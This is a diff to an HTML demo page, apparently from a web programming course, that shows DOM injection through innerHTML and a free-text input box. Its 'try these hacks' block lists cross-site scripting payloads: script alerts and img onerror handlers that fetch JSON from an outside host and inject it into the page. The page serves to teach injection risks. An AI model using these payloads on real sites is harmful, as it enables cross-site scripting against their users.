@@ -12,14 +12,23 @@
 
     <ul>
       <li>
-        <button onclick="injectDOMOperations('Injected with DOM operations')">Inject with operations</button>
+        <button onclick="injectDOMOperations('Injected with DOM operations')">
+          Inject with operations
+        </button>
       </li>
       <li>
-        <button onclick="injectDOMHTML('Injected with DOM innerHTML')">Inject with innerHTML</button>
+        <button onclick="injectDOMHTML('Injected with DOM innerHTML')">
+          Inject with innerHTML
+        </button>
       </li>
       <li>
         <button onclick="injectHTMLFromInput()">Inject anything</button>
-        <textarea id="html-text" rows="5" cols="33" placeholder="Enter any HTML"></textarea>
+        <textarea
+          id="html-text"
+          rows="5"
+          cols="33"
+          placeholder="Enter any HTML"
+        ></textarea>
       </li>
     </ul>
 
@@ -29,8 +38,8 @@ try these hacks
 &lt;b style="color:red">hello&lt;/b&gt;
 &lt;script&gt;alert("danger")&lt;/script&gt;
 &lt;img src='x' onerror='alert("danger")'/&gt;
+&lt;img src='x' onerror="fetch('https://cs260.click/hacked.json').then(r=&gt;r.json()).then(j=&gt;document.getElementById('output').innerHTML =j.code)"/&gt;
 &lt;img src='x' onerror="fetch('https://cs260.click/hacked.json').then(r=&gt;r.json()).then(j=&gt;console.log(j))"/&gt;
-&lt;img src='x' onerror="fetch('https://cs260.click/hacked.json').then(r=&gt;r.json()).then(j=&gt;document.getElementById('output').innerHTML =j.msg)"/&gt;
     </pre>
 
     <script src="dom.js"></script>
